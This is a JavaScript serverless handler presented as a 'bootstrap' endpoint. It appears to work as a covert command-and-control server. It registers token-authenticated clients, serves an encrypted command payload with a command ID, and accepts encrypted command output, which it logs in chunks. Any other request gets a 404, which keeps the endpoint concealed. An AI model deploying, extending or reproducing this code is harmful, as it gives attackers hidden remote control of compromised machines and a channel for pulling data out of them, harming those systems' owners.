import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '32';
const CONTROL_PAYLOAD = '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';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
